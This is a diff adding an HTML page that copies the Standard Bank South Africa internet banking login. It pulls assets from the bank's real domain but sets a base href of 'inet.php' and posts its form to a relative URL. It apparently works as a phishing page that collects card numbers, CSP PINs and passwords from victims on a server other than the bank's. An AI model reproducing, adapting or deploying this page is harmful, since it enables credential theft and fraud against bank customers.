@@ -1,0 +1,529 @@
+<html lang="en-ZA" xml:lang="en-ZA" xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <base href="inet.php" />
+  <title>
+   Internet banking
+  </title>
+  <meta content="IE=Edge" http-equiv="X-UA-Compatible" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+  <link href="https://www9.encrypt.standardbank.co.za/ibsa/images/favicon.ico" rel="shortcut icon" />
+  <link type="text/css" href="https://www9.encrypt.standardbank.co.za/ibsa/assets/css/font-awesome.min.css" rel="stylesheet" />
+  <link type="text/css" href="https://www9.encrypt.standardbank.co.za/ibsa/assets/css/dataTables.responsive.css" rel="stylesheet" />
+  <link type="text/css" href="https://www9.encrypt.standardbank.co.za/ibsa/assets/css/ladda-themeless.min.css" rel="stylesheet" />
+  <link type="text/css" href="https://www9.encrypt.standardbank.co.za/ibsa/assets/css/jquery-ui-1.10.0.custom.css" rel="stylesheet" />
+  <link type="text/css" href="https://www9.encrypt.standardbank.co.za/ibsa/assets/css/bootstrap.min.css" rel="stylesheet" />
+  <link type="text/css" href="https://www9.encrypt.standardbank.co.za/ibsa/assets/css/ib-bootstrap.css" rel="stylesheet" />
+  <!--[if IE]>
+		<style>
+			@media (min-width: 991px) {
+				 .navbar-nav {
+				    display:inline-block;
+				    float: none;
+				    margin: 0;
+				    height: 35px;
+				 }
+			}		    
+		</style>
+		<![endif]-->
+  <script src="https://www9.encrypt.standardbank.co.za/ibsa/assets/js/jquery-1.11.1.min.js" type="text/javascript">
+  </script>
+  <script src="https://www9.encrypt.standardbank.co.za/ibsa/assets/js/jquery-ui.min.js" type="text/javascript">
+  </script>
+  <script src="https://www9.encrypt.standardbank.co.za/ibsa/assets/js/bootstrap.min.js" type="text/javascript">
+  </script>
+  <script src="https://www9.encrypt.standardbank.co.za/ibsa/assets/js/jquery.dataTables.min.js" type="text/javascript">
+  </script>
+  <script src="https://www9.encrypt.standardbank.co.za/ibsa/assets/js/dataTables.bootstrap.js" type="text/javascript">
+  </script>
+  <script src="https://www9.encrypt.standardbank.co.za/ibsa/assets/js/dataTables.responsive.js" type="text/javascript">
+  </script>
+  <script src="https://www9.encrypt.standardbank.co.za/ibsa/assets/js/spin.min.js" type="text/javascript">
+  </script>
+  <style type="text/css">
+  </style>
+  <script src="https://www9.encrypt.standardbank.co.za/ibsa/assets/js/ladda.min.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   $(document).ready(function() {			
+			Ladda.bind( 'button[type=submit]'
+			//		, { timeout: 10000 }
+			);
+			$('#pageContent').css('opacity', '0').fadeTo(250, 1,'swing');			
+		});
+  </script>
+  <!--[if lt IE 9]>
+	<script src="/ibsa/assets/js/html5shiv.min.js"></script>
+	<script src="/ibsa/assets/js/respond.min.js"></script>
+	<![endif]-->
+  <script src="https://www9.encrypt.standardbank.co.za/ibsa/scripts/nifty.js" language="Javascript">
+  </script>
+  <script type="text/javascript">
+   try
+            {
+            window.onload=function()
+            {
+            if(!NiftyCheck())
+            return;
+	        }
+            }catch(exp){}
+  </script>
+  <script>
+   $(document).ready(function(){
+		    $("#tooltipPwd").tooltip({
+		        title : 'Hint: Your password is cAse sEnsiTive - Check your Caps Lock',
+		        placement : 'top'
+		    });
+		});
+  </script>
+ </head>
+ <body>
+  <!-- ########## HEADERS AND TOP MENU ########## -->
+  <div class="navbar navbar-default navbar-fixed-top">
+   <div id="topBarFrame">
+    <div class="row siteheader">
+     <div class="container">
+      <div class="siteLogo">
+       <img src="https://www9.encrypt.standardbank.co.za/ibsa/images/OrganizationLogo.png" alt="Standard Bank" class="" />
+      </div>
+      <div class="siteMap hidden-xs">
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div id="pageContentFrame">
+   <div id="pageContentMainFrame">
+    <!-- ########## PAGE CONTENT START ########## -->
+    <div class="product" id="pageContent" style="opacity: 1;">
+     <div class="container">
+      <br class="clearBoth" />
+      <!--[if lt IE 9]>
+					<script>
+						$(document).ready(function(){
+							document.getElementById('mainpage').style.display = 'none';
+						});
+						function hide_browser_msg() {
+							document.getElementById('upgrade-your-browser').style.display = 'none';
+							document.getElementById('mainpage').style.display = 'block';
+						}
+					</script>
+					<div id="upgrade-your-browser" class="upgrade-your-browser">	   
+					    <div class="row" align="center">
+					
+					        <h2>We have recently upgraded our Internet Banking site.<br></h2>
+							<h2>
+							Your browser is out of date. To ensure your browsing experience is optimal please upgrade to the latest version of Internet Explorer by clicking on the link below.
+					        </h2>
+					
+					        <div class="browser ie" align="center" style="text-align: center;">
+					            <a href="http://windows.microsoft.com/en-us/internet-explorer/download-ie">
+					                <img src="/ibsa/images/upgrade_your_browser/ie11.png" alt="firefox logo" height="180px;">
+					                <br>
+					                Download latest Internet Explorer
+					            </a>
+					        </div>
+					
+					        <h3>Or, try a different browser such as Google Chrome or Mozilla Firefox:</h3>
+					        
+					        <div class='row'>
+					        		<div class='col-xs-4'></div>
+							        <div class='col-xs-2'>
+							            <img src="/ibsa/images/upgrade_your_browser/chrome.jpg" alt="chrome logo" height="100px;">
+							            <br>
+						                <a href="https://www.google.com/chrome/browser/">					                    
+						                    Download latest Chrome
+						                </a>
+							         </div>
+							        <div class='col-xs-2'>
+							        	<img src="/ibsa/images/upgrade_your_browser/firefox.jpeg" alt="firefox logo" height="100px;">
+							        	<br>
+						                <a href="http://www.mozilla.com/firefox">	
+						                    Download latest Firefox
+						                </a>
+							        </div>
+							        <div class='col-xs-4'></div>
+							    </div>
+							               
+							</div>
+							<hr>
+							<div align="center">
+								<button class="btn btn-primary" onclick="hide_browser_msg();">Upgrade later</button><br>
+								<h3>Please note that should you choose this option your experience will not be optimal.</h3>
+							</div>
+					    </div>
+						<![endif]-->
+      <div class="row" id="mainpage">
+       <div class="col-sm-3">
+        <div class="quicklinksbox">
+         <h4>
+          Internet banking
+         </h4>
+         <ul class="dropdown">
+          <li class="menu-no-child">
+           <a data-target="#genericModal" href="https://www9.encrypt.standardbank.co.za/ibsa/customer/dbp.jsp" data-toggle="modal">
+            About Self-service Banking
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a href="https://www9.encrypt.standardbank.co.za/ibsa/InternetBanking">
+            Internet Banking Logon
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a target="_blank" href="http://www.standardbank.co.za/site/online_InternetBank/bankFunction.html">
+            Functionality
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a target="_blank" href="https://www.standardbank.co.za/standardbank/Personal/Self-service-banking/Current-internet-banking/FAQs">
+            FAQs
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a target="_blank" href="https://www.standardbank.co.za/standardbank/Personal/Self-service-banking/Current-internet-banking/FAQs/Cost">
+            Costs
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a target="_blank" href="https://www.standardbank.co.za/standardbank/About-Us">
+            About us
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a target="_blank" href="https://www.standardbank.co.za/standardbank/Contact-us">
+            Contact us
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a data-target="#genericModal" href="https://www9.encrypt.standardbank.co.za/ibsa/customer/terms.jsp" data-toggle="modal">
+            Electronic Banking Agreement
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a target="_blank" href="https://www.standardbank.co.za/standardbank/Personal/Self-service-banking/Current-internet-banking/Features/Auto-share-invest">
+            Auto Share Investment Agreement
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a target="_blank" href="https://www.standardbank.co.za/standardbank/About-Us/Privacy-and-security-statement">
+            Privacy and security
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a target="_blank" href="https://www.standardbank.co.za/standardbank/About-Us/Disclaimer">
+            Disclaimer
+           </a>
+          </li>
+          <li class="menu-no-child">
+           <a target="_blank" href="https://www.standardbank.co.za/">
+            Standard Bank home page
+           </a>
+          </li>
+         </ul>
+        </div>
+        <br />
+       </div>
+       <!-- ########## COLUMN 2 START ########## -->
+       <div class="col-sm-6">
+        <div class="panel panel-default">
+         <span style="font-size: xx-small; float: right; padding: 7px; color: #26428B; background-color: white;">
+          Monday, 21 December 2015 12:49:52
+         </span>
+         <div class="panel-body panel-content">
+          <h4>
+           <span class="lock">
+           </span>
+           Login
+          </h4>
+          <span class="alert-danger">
+          </span>
+          <br class="clearBoth" />
+          <script src="https://www9.encrypt.standardbank.co.za/ibsa/scripts/fields.js" language="Javascript">
+          </script>
+          <div class="panel-body">
+           <form autocomplete="off" onsubmit="return submitOnce()" method="post" action="?LOB=53022&ent_logon=&Logon=&dltoken=22154895s5996az25486q54" class="form-horizontal" id="signonForm">
+            <!-- Form Name -->
+            <!-- 				<legend>Login</legend> -->
+            <!-- Text input-->
+            <div class="form-group">
+             <label for="ccn" class="col-md-4 control-label">
+              Card
+             </label>
+             <div class="col-md-6">
+              <input type="text" class="form-control input-sm" placeholder="***** ***** ***** ***" name="ccn" id="ccn" />
+              <span class="alert-danger">
+              </span>
+             </div>
+            </div>
+            <!-- Password input-->
+            <div class="form-group">
+             <label for="csp" class="col-md-4 control-label">
+              CSP
+             </label>
+             <div class="col-md-6">
+              <input type="password" maxlength="5" class="form-control input-sm" placeholder="*****" name="csp" id="csp" />
+              <span class="alert-danger">
+              </span>
+             </div>
+            </div>
+            <!-- Password input-->
+            <div class="form-group">
+             <label for="pwd" class="col-md-4 control-label">
+              Password
+              <i id="tooltipPwd" class="glyphicon glyphicon-question-sign" data-original-title="" title="">
+              </i>
+             </label>
+             <div class="col-md-6">
+              <input type="password" class="form-control input-sm" placeholder="" name="pwd" id="pwd" />
+              <span class="alert-danger">
+              </span>
+             </div>
+            </div>
+            <!-- Multiple Checkboxes -->
+            <div class="form-group">
+             <label for="checkboxes" class="col-md-4 control-label">
+              Change
+             </label>
+             <div class="col-md-6">
+              <div class="list-group checkbox">
+               <label for="changecsp">
+                <input type="checkbox" value="ON" id="changecsp" name="changePin" />
+                CSP
+               </label>
+              </div>
+              <div class="list-group checkbox">
+               <label for="changepass">
+                <input type="checkbox" value="ON" id="changepass" name="changePwd" />
+                Password
+               </label>
+              </div>
+             </div>
+            </div>
+            <!-- Button (Double) -->
+            <div class="form-group">
+             <label for="login" class="col-md-4 control-label">
+             </label>
+             <div class="col-md-6">
+              <button data-style="expand-left" class="btn btn-primary ladda-button" value="Login" name="login" id="login" type="submit">
+               <span class="ladda-label">
+                Login
+               </span>
+               <span class="ladda-spinner">
+               </span>
+               <div style="width: 0px;" class="ladda-progress">
+               </div>
+               <span class="ladda-spinner">
+               </span>
+              </button>
+             </div>
+            </div>
+           </form>
+           <div>
+            <p>
+             By logging on I acknowledge that I have read, understood and am
+													bound by the version of the
+             <a data-target="#genericModal" href="/ibsa/customer/terms.jsp" data-toggle="modal">
+              Electronic Banking Agreement
+             </a>
+             that is posted on the website at the time of logging on. (Last
+													updated: 27 September 2013)
+            </p>
+           </div>
+           <script language="JavaScript" type="text/javascript">
+            &lt;!--
+							                    var focusControl = document.forms["signonForm"].elements["ccn"];
+							                    if (focusControl != null &amp;&amp; focusControl.type != "hidden") {
+							                    focusControl.focus();
+							                    }
+							                    // --&gt;
+           </script>
+           <hr />
+           <div align="center">
+            <a target="_blank" id="quiz" href="http://www.securitycentre.standardbank.co.za/">
+             <img alt="Take the quiz" src="https://www9.encrypt.standardbank.co.za/ibsa/images/take_the_quiz_large.jpg" class="img-responsive" />
+            </a>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <!-- ########## COLUMN 2 END ########## -->
+       <div class="col-sm-3">
+        <div class="right-tile">
+         <h4>
+          <span class="mouseicon">
+          </span>
+          Registration
+         </h4>
+         <div class="right-tile_content quicklinksbox">
+          <ul>
+           <li>
+            <a href="https://www1.encrypt.standardbank.co.za/ADWeb/register_za.do">
+             Register
+            </a>
+           </li>
+           <li>
+            <a href="https://www9.encrypt.standardbank.co.za/ibsa/customer/start_reactivate.do">
+             Create PIN and Password
+            </a>
+           </li>
+           <li>
+            <a href="https://www9.encrypt.standardbank.co.za/ibsa/customer/start_reset_csp_pwd.do">
+             Reset Password and CSP
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <br class="clearBoth" />
+        <div class="panel panel-default tile-sm">
+         <div class="panel-body panel-content">
+          <h4>
+           Customer Care Line
+          </h4>
+          <div class="customer_care--details">
+           <img src="https://www12.encrypt.standardbank.co.za/ibsa/images/icon_south_africa.png" class="customer_care--img" />
+           <p>
+            South Africa
+            <br />
+            0860 123 000
+           </p>
+          </div>
+          <div class="customer_care--details">
+           <img src="https://www12.encrypt.standardbank.co.za/ibsa/images/icon_global.png" class="customer_care--img" />
+           <p>
+            International
+            <br />
+            +27 11 299 4701
+           </p>
+          </div>
+          <div class="customer_care--details">
+           <img src="https://www12.encrypt.standardbank.co.za/ibsa/images/icon_email.png" class="customer_care--img" />
+           <p>
+            Email
+            <br />
+            Send us an
+            <a href="mailto:ibsupport@standardbank.co.za">
+             email
+            </a>
+           </p>
+          </div>
+         </div>
+        </div>
+       </div>
+       <br class="clearBoth" />
+       <br class="clearBoth" />
+       <br class="clearBoth" />
+      </div>
+     </div>
+     <hr />
+    </div>
+   </div>
+   <!-- ########## PAGE CONTENT END ########## -->
+  </div>
+  <!-- ########## FOOTER ########## -->
+  <footer>
+   <div class="row">
+    <div class="col-sm-12">
+     <img alt="Movingforwardtrademarklogo" src="https://www9.encrypt.standardbank.co.za/ibsa/images/movingfwd.png" style="padding-top: 10px; padding-right: 20px; width: 135px;" class="img-responsive pull-right" />
+     <p style="padding-top: 10px; padding-left: 20px;" class="pull-left">
+      <small>
+       © 2014 Standard bank
+       <span id="footerText">
+        is a licensed financial services provider in terms of the Financial Advisory and Intermediary
+				Services Act.
+       </span>
+      </small>
+     </p>
+    </div>
+   </div>
+  </footer>
+  <!-- Modal -->
+  <div aria-hidden="true" aria-labelledby="genericModalLabel" role="dialog" id="genericModal" class="modal">
+   <div class="modal-dialog">
+    <div class="modal-content">
+    </div>
+    <!-- /.modal-content -->
+   </div>
+   <!-- /.modal-dialog -->
+  </div>
+  <!-- /.modal -->
+  <script type="text/javascript">
+   $('body').on('hidden.bs.modal', '.modal', function() {
+		$(this).removeData('bs.modal');
+		$('body').removeClass('modal-open');
+		$('.modal-backdrop').remove();
+		$('.in').remove();
+	});
+  </script>
+  <style type="text/css">
+   @media print {
+	body.modal-open #pageContentFrame {
+		display: none;
+	}
+	
+	body.modal-open #pageContentMainFrame {
+		display: none;
+	}
+	
+	body.modal-open .btn, body.modal-open .modal-footer {
+		display: none;
+	}
+
+	button.close {
+		display: none;
+	}
+	 
+ 	body.modal-open, body.modal-open #genericModalBody, body.modal-open #genericModal, body.modal-open .modal-body {
+		width: auto;
+		height: auto;
+		overflow: visible;
+		display: block;
+	} 
+	
+	body.modal-open #genericModal {
+		width: auto;
+		height: auto;
+		overflow: visible;
+		display: block;
+		position: relative;
+	}
+}
+  </style>
+  <script type="text/javascript">
+   this.$('.js-loading-bar').modal({
+	  show: false
+	}).on('shown.bs.modal', function( event ) {
+
+	   var $bar = $(event.target).find('.progress-bar'),
+	       _wait = function() {       
+	            setTimeout(function() {
+	              if ( $bar.is(':visible')) { 
+	                   $bar.addClass('animate');
+	               } else {
+	                  _wait();
+	               }
+	            }, 0);       
+	       };
+	   
+	   _wait();
+	   
+	});
+
+	$('.dropdown-menu').click(function() {
+	  var $modal = $('.js-loading-bar'),
+	      $bar = $modal.find('.progress-bar');
+	  
+	  setTimeout(function() {
+		  $modal.modal('show');
+	  }, 0);	  
+
+	  setTimeout(function() {
+	    $modal.modal('hide'); 
+	    $bar.removeClass('animate');
+	  }, 60000);
+	});
+  </script>
+ </body>
+</html>
